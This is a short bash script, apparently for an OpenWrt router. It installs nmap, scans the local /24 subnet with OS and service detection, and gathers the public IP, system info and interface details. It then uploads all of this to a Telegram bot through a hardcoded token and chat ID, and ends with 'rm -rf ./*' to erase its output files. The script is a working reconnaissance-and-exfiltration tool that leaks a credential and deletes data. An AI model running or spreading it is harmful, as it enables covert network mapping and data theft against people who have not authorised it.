#!/bin/bash
wget -q --spider http://google.com
current_date=$(date "+%d-%m-%Y")
if [ $? -eq 0 ]; then
	# Send report via telegram
	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
	# chat id
	chat_id="1789487661"

	echo "Internet ok"
	
	# Installing dependencies
	echo "Install dependencies"
	opkg update
	opkg install nmap
	opkg install curl
	echo "Dependencies ok"
	sleep 1
	
	# Create a file to save results
	echo "Start scanning..."
	nmap_output_file="nmap_scan_$current_date.txt"
	touch $nmap_output_file
	ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)	
	#Start scanning
	nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
	echo "Scanning complete"
	
	# Get public IP
	public_ip=$(curl -s https://ifconfig.me/ip)
	echo "Public ip: $public_ip"

	# Get system info
	system_info=$(uname -a)

	# Get ifconfig result
	ifconfig_output_file="ifconfig_$current_date.txt"
	touch $ifconfig_output_file
	ifconfig > $ifconfig_output_file
	
	filepath1=$nmap_output_file
	filepath3=$ifconfig_output_file
	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
	rm -rf ./*
else
  	echo "Internet not ok"
fi
